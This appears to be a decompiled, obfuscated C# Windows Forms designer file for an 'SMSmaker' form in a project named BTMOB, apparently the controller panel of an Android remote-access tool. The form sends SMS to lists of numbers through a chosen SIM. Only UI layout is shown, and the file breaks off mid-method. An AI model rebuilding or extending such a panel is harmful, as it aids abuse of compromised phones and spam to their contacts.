using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace BTMOB;

[DesignerGenerated]
public class SMSmaker : basestyle
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("remnum")]
	private DrakeUIButtonIcon _remnum;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("addnum")]
	private DrakeUIButtonIcon _addnum;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("numslist")]
	private ListBox _numslist;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("sendbtn")]
	private DrakeUIButtonIcon _sendbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("cncelbtn")]
	private DrakeUIButtonIcon _cncelbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("importbtn")]
	private DrakeUIButtonIcon _importbtn;

	[field: AccessedThroughProperty("TableLayoutPanel1")]
	internal virtual TableLayoutPanel TableLayoutPanel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel4")]
	internal virtual Panel Panel4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("phonetext")]
	internal virtual DrakeUITextBox phonetext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon remnum
	{
		[CompilerGenerated]
		get
		{
			return _remnum;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = remnum_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _remnum;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_remnum = value;
			drakeUIButtonIcon = _remnum;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel6")]
	internal virtual Panel Panel6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel5")]
	internal virtual Panel Panel5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("emptytext")]
	internal virtual Label emptytext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon addnum
	{
		[CompilerGenerated]
		get
		{
			return _addnum;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = addnum_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _addnum;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_addnum = value;
			drakeUIButtonIcon = _addnum;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual ListBox numslist
	{
		[CompilerGenerated]
		get
		{
			return _numslist;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = numslist_SelectedIndexChanged;
			ListBox listBox = _numslist;
			if (listBox != null)
			{
				listBox.SelectedIndexChanged -= value2;
			}
			_numslist = value;
			listBox = _numslist;
			if (listBox != null)
			{
				listBox.SelectedIndexChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("msgtext")]
	internal virtual DrakeUITextBox msgtext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W2")]
	internal new virtual DrakeWidth_W DrakeWidth_W2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W3")]
	internal virtual DrakeWidth_W DrakeWidth_W3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("combosims")]
	internal virtual DrakeUIComboBox combosims
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon sendbtn
	{
		[CompilerGenerated]
		get
		{
			return _sendbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _sendbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_sendbtn = value;
			drakeUIButtonIcon = _sendbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon cncelbtn
	{
		[CompilerGenerated]
		get
		{
			return _cncelbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon3_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _cncelbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_cncelbtn = value;
			drakeUIButtonIcon = _cncelbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon importbtn
	{
		[CompilerGenerated]
		get
		{
			return _importbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon2_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _importbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_importbtn = value;
			drakeUIButtonIcon = _importbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W4")]
	internal virtual DrakeWidth_W DrakeWidth_W4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public SMSmaker()
	{
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.SMSmaker));
		this.TableLayoutPanel1 = new System.Windows.Forms.TableLayoutPanel();
		this.Panel6 = new System.Windows.Forms.Panel();
		this.Panel2 = new System.Windows.Forms.Panel();
		this.msgtext = new DrakeUI.Framework.DrakeUITextBox();
		this.Label1 = new System.Windows.Forms.Label();
		this.Panel5 = new System.Windows.Forms.Panel();
		this.numslist = new System.Windows.Forms.ListBox();
		this.importbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.emptytext = new System.Windows.Forms.Label();
		this.remnum = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W3 = new DrakeUI.Framework.DrakeWidth_W();
		this.addnum = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Panel3 = new System.Windows.Forms.Panel();
		this.DrakeWidth_W4 = new DrakeUI.Framework.DrakeWidth_W();
		this.combosims = new DrakeUI.Framework.DrakeUIComboBox();
		this.phonetext = new DrakeUI.Framework.DrakeUITextBox();
		this.Panel4 = new System.Windows.Forms.Panel();
		this.cncelbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.sendbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W2 = new DrakeUI.Framework.DrakeWidth_W();
		((System.ComponentModel.ISupportInitialize)this.myscr).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.myico).BeginInit();
		this.tobpanelsti.SuspendLayout();
		this.TableLayoutPanel1.SuspendLayout();
		this.Panel6.SuspendLayout();
		this.Panel2.SuspendLayout();
		this.Panel5.SuspendLayout();
		this.Panel3.SuspendLayout();
		this.Panel4.SuspendLayout();
		base.SuspendLayout();
		this.myscr.Visible = false;
		this.pinbtn.Location = new System.Drawing.Point(607, 5);
		this.pinbtn.Visible = false;
		this.minibtn.Location = new System.Drawing.Point(649, 5);
		this.minibtn.Visible = false;
		this.closbtn.Location = new System.Drawing.Point(691, 5);
		this.closbtn.Visible = false;
		this.mytitle.Location = new System.Drawing.Point(5, 4);
		this.mytitle.Size = new System.Drawing.Size(723, 18);
		this.tobpanelsti.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.tobpanelsti.Size = new System.Drawing.Size(733, 26);
		this.TableLayoutPanel1.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.TableLayoutPanel1.ColumnCount = 2;
		this.TableLayoutPanel1.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 50f));
		this.TableLayoutPanel1.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 401f));
		this.TableLayoutPanel1.Controls.Add(this.Panel6, 1, 0);
		this.TableLayoutPanel1.Controls.Add(this.Panel5, 0, 0);
		this.TableLayoutPanel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.TableLayoutPanel1.Location = new System.Drawing.Point(2, 104);
		this.TableLayoutPanel1.Name = EXGuarder._74451632;
		this.TableLayoutPanel1.RowCount = 1;
		this.TableLayoutPanel1.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 50f));
		this.TableLayoutPanel1.Size = new System.Drawing.Size(733, 499);
		this.TableLayoutPanel1.TabIndex = 40;
		this.Panel6.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel6.Controls.Add(this.Panel2);
		this.Panel6.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel6.Location = new System.Drawing.Point(335, 3);
		this.Panel6.Name = EXGuarder._365B2B45;
		this.Panel6.Padding = new System.Windows.Forms.Padding(9);
		this.Panel6.Size = new System.Drawing.Size(395, 493);
		this.Panel6.TabIndex = 44;
		this.Panel2.Controls.Add(this.msgtext);
		this.Panel2.Controls.Add(this.Label1);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel2.Location = new System.Drawing.Point(9, 9);
		this.Panel2.Name = EXGuarder._4A714654;
		this.Panel2.Size = new System.Drawing.Size(377, 475);
		this.Panel2.TabIndex = 2;
		this.msgtext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.msgtext.Dock = System.Windows.Forms.DockStyle.Fill;
		this.msgtext.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.msgtext.Font = new System.Drawing.Font(EXGuarder._4E6C2E39, 9f);
		this.msgtext.ForeColor = System.Drawing.Color.White;
		this.msgtext.Location = new System.Drawing.Point(0, 28);
		this.msgtext.Margin = new System.Windows.Forms.Padding(4);
		this.msgtext.Maximum = 2147483647.0;
		this.msgtext.Minimum = -2147483648.0;
		this.msgtext.Multiline = true;
		this.msgtext.Name = EXGuarder._430B3406;
		this.msgtext.Padding = new System.Windows.Forms.Padding(4);
		this.msgtext.Radius = 15;
		this.msgtext.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.msgtext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.msgtext.Size = new System.Drawing.Size(377, 447);
		this.msgtext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.msgtext.StyleCustomMode = true;
		this.msgtext.TabIndex = 19;
		this.msgtext.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
		this.msgtext.Watermark = EXGuarder._780C283A;
		this.Label1.Dock = System.Windows.Forms.DockStyle.Top;
		this.Label1.Font = new System.Drawing.Font(EXGuarder._4E6C2E39, 10f, System.Drawing.FontStyle.Bold);
		this.Label1.ForeColor = System.Drawing.Color.Transparent;
		this.Label1.Location = new System.Drawing.Point(0, 0);
		this.Label1.Name = EXGuarder._084A6C64;
		this.Label1.Size = new System.Drawing.Size(377, 28);
		this.Label1.TabIndex = 43;
		this.Label1.Text = EXGuarder._016F7634;
		this.Label1.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.Panel5.Controls.Add(this.numslist);
		this.Panel5.Controls.Add(this.importbtn);
		this.Panel5.Controls.Add(this.emptytext);
		this.Panel5.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel5.Location = new System.Drawing.Point(3, 3);
		this.Panel5.Name = EXGuarder._1D2F0559;
		this.Panel5.Padding = new System.Windows.Forms.Padding(10, 9, 10, 9);
		this.Panel5.Size = new System.Drawing.Size(326, 493);
		this.Panel5.TabIndex = 43;
		this.numslist.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.numslist.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.numslist.Dock = System.Windows.Forms.DockStyle.Fill;
		this.numslist.Font = new System.Drawing.Font(EXGuarder._4E6C2E39, 9f);
		this.numslist.ForeColor = System.Drawing.Color.White;
		this.numslist.FormattingEnabled = true;
		this.numslist.ItemHeight = 18;
		this.numslist.Location = new System.Drawing.Point(10, 37);
		this.numslist.Name = EXGuarder._47643D16;
		this.numslist.Size = new System.Drawing.Size(306, 408);
		this.numslist.TabIndex = 44;
		this.importbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.importbtn.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.importbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.importbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.importbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.importbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.importbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.importbtn.Font = new System.Drawing.Font(EXGuarder._4E6C2E39, 9f);
		this.importbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.importbtn.ForeDisableColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.importbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.importbtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.importbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.importbtn.Location = new System.Drawing.Point(10, 445);
		this.importbtn.Margin = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.importbtn.Name = EXGuarder._3F46213B;
		this.importbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.importbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.importbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.importbtn.RectPressColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.importbtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.importbtn.Size = new System.Drawing.Size(306, 39);
		this.importbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.importbtn.Symbol = 61584;
		this.importbtn.TabIndex = 45;
		this.importbtn.Text = EXGuarder._472A562C;
		this.emptytext.Dock = System.Windows.Forms.DockStyle.Top;
		this.emptytext.Font = new System.Drawing.Font(EXGuarder._4E6C2E39, 9f, System.Drawing.FontStyle.Bold);
		this.emptytext.ForeColor = System.Drawing.Color.Transparent;
		this.emptytext.Location = new System.Drawing.Point(10, 9);
		this.emptytext.Name = EXGuarder._2E160308;
		this.emptytext.Size = new System.Drawing.Size(306, 28);
		this.emptytext.TabIndex = 42;
		this.emptytext.Text = EXGuarder._0F2A1358;
		this.emptytext.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.remnum.Cursor = System.Windows.Forms.Cursors.Hand;
		this.remnum.Dock = System.Windows.Forms.DockStyle.Left;
		this.remnum.Enabled = false;
		this.remnum.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.remnum.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.remnum.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.remnum.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.remnum.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.remnum.Font = new System.Drawing.Font(EXGuarder._4E6C2E39, 9f);
		this.remnum.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.remnum.ForeDisableColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.remnum.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.remnum.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.remnum.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.remnum.Location = new System.Drawing.Point(212, 9);
		this.remnum.Name = EXGuarder._14126D67;
		this.remnum.Radius = 15;
		this.remnum.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.remnum.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.remnum.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.remnum.RectPressColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.remnum.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.remnum.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Bottom;
		this.remnum.Size = new System.Drawing.Size(40, 22);
		this.remnum.Style = DrakeUI.Framework.UIStyle.Custom;
		this.remnum.Symbol = 61544;
		this.remnum.SymbolSize = 19;
		this.remnum.TabIndex = 20;
		this.DrakeWidth_W3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W3.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeWidth_W3.Location = new System.Drawing.Point(252, 9);
		this.DrakeWidth_W3.Name = EXGuarder._68492A41;
		this.DrakeWidth_W3.Size = new System.Drawing.Size(16, 22);
		this.DrakeWidth_W3.TabIndex = 23;
		this.addnum.Cursor = System.Windows.Forms.Cursors.Hand;
		this.addnum.Dock = System.Windows.Forms.DockStyle.Left;
		this.addnum.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.addnum.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.addnum.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.addnum.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.addnum.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.addnum.Font = new System.Drawing.Font(EXGuarder._4E6C2E39, 9f);
		this.addnum.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.addnum.ForeDisableColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.addnum.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.addnum.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.addnum.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.addnum.Location = new System.Drawing.Point(268, 9);
		this.addnum.Name = EXGuarder._3F72201D;
		this.addnum.Radius = 15;
		this.addnum.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.addnum.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.addnum.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.addnum.RectPressColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.addnum.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.addnum.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Bottom;
		this.addnum.Size = new System.Drawing.Size(40, 22);
		this.addnum.Style = DrakeUI.Framework.UIStyle.Custom;
		this.addnum.Symbol = 61543;
		this.addnum.SymbolSize = 19;
		this.addnum.TabIndex = 19;
		this.Panel3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel3.Controls.Add(this.addnum);
		this.Panel3.Controls.Add(this.DrakeWidth_W3);
		this.Panel3.Controls.Add(this.remnum);
		this.Panel3.Controls.Add(this.DrakeWidth_W4);
		this.Panel3.Controls.Add(this.combosims);
		this.Panel3.Controls.Add(this.phonetext);
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel3.Location = new System.Drawing.Point(2, 64);
		this.Panel3.Name = EXGuarder._0B4F5E04;
		this.Panel3.Padding = new System.Windows.Forms.Padding(9);
		this.Panel3.Size = new System.Drawing.Size(733, 40);
		this.Panel3.TabIndex = 41;
		this.DrakeWidth_W4.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W4.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeWidth_W4.Location = new System.Drawing.Point(196, 9);
		this.DrakeWidth_W4.Name = EXGuarder._7611073E;
		this.DrakeWidth_W4.Size = new System.Drawing.Size(16, 22);
		this.DrakeWidth_W4.TabIndex = 50;
		this.combosims.Dock = System.Windows.Forms.DockStyle.Right;
		this.combosims.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.combosims.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.combosims.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.combosims.Font = new System.Drawing.Font(EXGuarder._4E6C2E39, 9f);
		this.combosims.ForeColor = System.Drawing.Color.White;
		this.combosims.Items.AddRange(new object[1] { EXGuarder._324C486B });
		this.combosims.Location = new System.Drawing.Point(581, 9);
		this.combosims.Margin = new System.Windows.Forms.Padding(4);
		this.combosims.MinimumSize = new System.Drawing.Size(56, 0);
		this.combosims.Name = EXGuarder._3F511570;
		this.combosims.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.combosims.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.combosims.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.combosims.Size = new System.Drawing.Size(143, 25);
		this.combosims.Style = DrakeUI.Framework.UIStyle.Custom;
		this.combosims.TabIndex = 49;
		this.combosims.Text = EXGuarder._324C486B;
		this.combosims.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.combosims.Watermark = EXGuarder._74501F3F;
		this.phonetext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.phonetext.Dock = System.Windows.Forms.DockStyle.Left;
		this.phonetext.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.phonetext.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.phonetext.Font = new System.Drawing.Font(EXGuarder._4E6C2E39, 9f);
		this.phonetext.ForeColor = System.Drawing.Color.White;
		this.phonetext.Location = new System.Drawing.Point(9, 9);
		this.phonetext.Margin = new System.Windows.Forms.Padding(4);
		this.phonetext.Maximum = 2147483647.0;
		this.phonetext.Minimum = -2147483648.0;
		this.phonetext.Name = EXGuarder._0160600D;
		this.phonetext.Padding = new System.Windows.Forms.Padding(4);
		this.phonetext.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.phonetext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.phonetext.Size = new System.Drawing.Size(187, 25);
		this.phonetext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.phonetext.TabIndex = 18;
		this.phonetext.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.phonetext.Watermark = EXGuarder._780C283A;
		this.Panel4.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel4.Controls.Add(this.cncelbtn);
		this.Panel4.Controls.Add(this.sendbtn);
		this.Panel4.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel4.Location = new System.Drawing.Point(2, 603);
		this.Panel4.Name = EXGuarder._07063D11;
		this.Panel4.Padding = new System.Windows.Forms.Padding(10, 9, 10, 9);
		this.Panel4.Size = new System.Drawing.Size(733, 57);
		this.Panel4.TabIndex = 42;
		this.Panel4.Controls.SetChildIndex(this.sendbtn, 0);
		this.Panel4.Controls.SetChildIndex(this.cncelbtn, 0);
		this.cncelbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.cncelbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.cncelbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.cncelbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.cncelbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.cncelbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.cncelbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.cncelbtn.Font = new System.Drawing.Font(EXGuarder._4E6C2E39, 9f);
		this.cncelbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.cncelbtn.ForeDisableColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.cncelbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.cncelbtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.cncelbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.cncelbtn.Location = new System.Drawing.Point(523, 9);
		this.cncelbtn.Margin = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.cncelbtn.Name = EXGuarder._28770549;
		this.cncelbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.cncelbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.cncelbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.cncelbtn.RectPressColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.cncelbtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.cncelbtn.Size = new System.Drawing.Size(100, 39);
		this.cncelbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.cncelbtn.Symbol = 61453;
		this.cncelbtn.TabIndex = 27;
		this.cncelbtn.Text = EXGuarder._0C4C221C;
		this.sendbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.sendbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.sendbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.sendbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.sendbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.sendbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.sendbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.sendbtn.Font = new System.Drawing.Font(EXGuarder._4E6C2E39, 9f);
		this.sendbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.sendbtn.ForeDisableColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.sendbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.sendbtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.sendbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.sendbtn.Location = new System.Drawing.Point(623, 9);
		this.sendbtn.Margin = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.sendbtn.Name = EXGuarder._4342310D;
		this.sendbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.sendbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.sendbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.sendbtn.RectPressColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.sendbtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.sendbtn.Size = new System.Drawing.Size(100, 39);
		this.sendbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.sendbtn.TabIndex = 26;
		this.sendbtn.Text = EXGuarder._41047748;
		this.DrakeWidth_W2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W2.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeWidth_W2.Location = new System.Drawing.Point(598, 9);
		this.DrakeWidth_W2.Name = EXGuarder._19193629;
		this.DrakeWidth_W2.Size = new System.Drawing.Size(25, 39);
		this.DrakeWidth_W2.TabIndex = 22;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 18f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(737, 662);
		base.Controls.Add(this.TableLayoutPanel1);
		base.Controls.Add(this.Panel4);
		base.Controls.Add(this.Panel3);
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._50674151);
		base.Name = EXGuarder._39433F60;
		this.Text = EXGuarder._28006F12;
		base.TopMost = true;
		base.Controls.SetChildIndex(this.tobpanelsti, 0);
		base.Controls.SetChildIndex(this.Panel3, 0);
		base.Controls.SetChildIndex(this.Panel4, 0);
		base.Controls.SetChildIndex(this.TableLayoutPanel1, 0);
		((System.ComponentModel.ISupportInitialize)this.myscr).EndInit();
		((System.ComponentModel.ISupportInitialize)this.myico).EndInit();
		this.tobpanelsti.ResumeLayout(false);
